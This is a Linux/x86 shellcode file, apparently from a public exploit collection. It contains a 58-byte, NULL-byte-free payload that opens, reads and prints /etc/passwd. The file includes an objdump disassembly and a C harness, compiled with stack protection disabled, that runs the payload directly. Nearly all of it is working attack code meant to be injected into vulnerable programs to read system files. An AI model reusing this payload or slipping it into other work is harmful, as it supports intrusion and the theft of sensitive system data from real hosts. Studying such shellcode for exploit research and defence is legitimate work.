/*
# Shellcode Title: Linux/x86 - Read File (/etc/passwd) (58 bytes). NULL byte free
# Date: 2019-01-31
# Author: Kiewicz (@_Kiewicz)
# Homepage: https://0xkiewicz.github.io
# Tested on: Debian/x86
# gcc -o shellcode -z execstack -fno-stack-protector shellcode.c
# PA-7854
*/


/******************************************************************
$ objdump -d -M intel read_file

read_file:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 28                	jmp    804808a <read_file>

08048062 <open>:
 8048062:	5b                   	pop    ebx
 8048063:	31 c9                	xor    ecx,ecx
 8048065:	f7 e1                	mul    ecx
 8048067:	99                   	cdq
 8048068:	b0 05                	mov    al,0x5
 804806a:	cd 80                	int    0x80

0804806c <read>:
 804806c:	89 c3                	mov    ebx,eax
 804806e:	b0 03                	mov    al,0x3
 8048070:	89 e7                	mov    edi,esp
 8048072:	89 f9                	mov    ecx,edi
 8048074:	31 d2                	xor    edx,edx
 8048076:	b2 ff                	mov    dl,0xff
 8048078:	cd 80                	int    0x80

0804807a <write>:
 804807a:	89 c2                	mov    edx,eax
 804807c:	31 c0                	xor    eax,eax
 804807e:	b0 04                	mov    al,0x4
 8048080:	31 db                	xor    ebx,ebx
 8048082:	b3 01                	mov    bl,0x1
 8048084:	cd 80                	int    0x80

08048086 <exit>:
 8048086:	b0 01                	mov    al,0x1
 8048088:	cd 80                	int    0x80

0804808a <read_file>:
 804808a:	e8 d3 ff ff ff       	call   8048062 <open>

0804808f <filetoread>:
 804808f:	2f                   	das
 8048090:	65 74 63             	gs je  80480f6 <filetoread+0x67>
 8048093:	2f                   	das
 8048094:	70 61                	jo     80480f7 <filetoread+0x68>
 8048096:	73 73                	jae    804810b <filetoread+0x7c>
 8048098:	77 64                	ja     80480fe <filetoread+0x6f>
******************************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\xeb\x28\x5b\x31\xc9\xf7\xe1\x99\xb0\x05\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x31\xd2\xb2\xff\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\xb3\x01\xcd\x80\xb0\x01\xcd\x80\xe8\xd3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
	return 0;
}